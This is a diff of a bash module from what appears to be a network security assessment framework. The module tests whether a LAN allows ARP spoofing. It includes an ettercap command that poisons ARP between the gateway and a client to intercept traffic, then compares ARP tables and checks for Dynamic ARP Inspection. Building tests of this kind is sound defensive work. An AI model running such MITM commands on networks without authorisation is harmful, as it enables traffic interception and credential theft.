@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="ARP Spoofing / MITM Test"
+# CATEGORY="G"
+# DEPS="B1"
+# CRITICAL="yes"
+# TOOLS="yersinia,ip"
+# DESC="Attempt to ARP-spoof the gateway to intercept traffic"
+# REQS="managed_iface,gateway_ip"
+# PCAP="yes"
+# DECODE="mitm_arp_tls"
+
 #===============================================================================
 #  modules/g1_arp_spoofing.sh
 #  G1: ARP Spoofing / MITM Test
@@ -99,16 +110,16 @@ run_g1() {
         echo "=== ARP Table Before Test ==="
         echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
         echo ""
-        ${TOOL_PATHS[ip]} neigh show dev "$iface" 2>/dev/null
+        run_tool ip neigh show dev "$iface" 2>/dev/null
         echo ""
         echo "=== Gateway ARP entry ==="
-        ${TOOL_PATHS[ip]} neigh show "$gw_ip" dev "$iface" 2>/dev/null
+        run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
     } > "$arp_before"
 
     local gw_real_mac
-    local gw_real_mac=$(${TOOL_PATHS[ip]} neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
+    local gw_real_mac=$(run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
     local my_mac
-    local my_mac=$(${TOOL_PATHS[ip]} link show "$iface" 2>/dev/null | awk '/ether/{print $2}')
+    local my_mac=$(run_tool ip link show "$iface" 2>/dev/null | awk '/ether/{print $2}')
 
     log_info "Gateway real MAC: ${gw_real_mac}"
     log_info "Our MAC: ${my_mac}"
@@ -121,7 +132,7 @@ run_g1() {
         local b1_data
         local b1_data=$(load_tc_result "B1")
         local first_client
-        local first_client=$(echo "$b1_data" | ${TOOL_PATHS[jq]} -r '.reachable_clients[0].ip // ""')
+        local first_client=$(echo "$b1_data" | run_tool jq -r '.reachable_clients[0].ip // ""')
         if [[ -n "$first_client" ]]; then
             echo ""
             echo -e "  ${C_CYAN}Found reachable client from B1: ${first_client}${C_RESET}"
@@ -212,7 +223,7 @@ run_g1() {
         echo "Using ettercap..." >> "$spoof_file"
 
         start_countdown 30 "Ettercap ARP MITM active"
-        run_attack_tool --timeout 30 --log "$spoof_file" --cmd "ettercap -T -q -M arp:remote /${gw_ip}// /${target_ip}// -i $iface"
+        timeout 30 ettercap -T -q -M arp:remote "/${gw_ip}//" "/${target_ip}//" -i "$iface" >> "$spoof_file" 2>&1 || true
         stop_countdown
 
         # Check capture
@@ -240,10 +251,10 @@ run_g1() {
         echo "=== ARP Table After Test ==="
         echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
         echo ""
-        ${TOOL_PATHS[ip]} neigh show dev "$iface" 2>/dev/null
+        run_tool ip neigh show dev "$iface" 2>/dev/null
         echo ""
         echo "=== Gateway ARP entry ==="
-        ${TOOL_PATHS[ip]} neigh show "$gw_ip" dev "$iface" 2>/dev/null
+        run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
     } > "$arp_after"
 
     # Check if our connectivity was killed (DAI may have blocked us)
@@ -267,7 +278,7 @@ run_g1() {
 
         # Check if gateway ARP entry changed
         local gw_current_mac
-        local gw_current_mac=$(${TOOL_PATHS[ip]} neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
+        local gw_current_mac=$(run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
 
         if [[ "$gw_current_mac" == "$my_mac" ]]; then
             local arp_spoof_possible="true"
@@ -308,7 +319,7 @@ run_g1() {
     evidence_register_file "g1_arp_table_after.txt"
     evidence_register_file "g1_mitm_capture.pcap"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json=$(run_tool jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "ARP spoof: ${arp_spoof_possible}, Traffic intercepted: ${traffic_intercepted}, DAI: ${dai_enabled}" \
@@ -332,7 +343,7 @@ run_g1() {
             gateway_ip: $gateway_ip,
                     }')
 
-    save_tc_result "G1" "$result_json"
+    save_tc_result "G1" "$result_json" "has_tool_output:1,clean_run:1"
 
     # Display summary
     echo ""
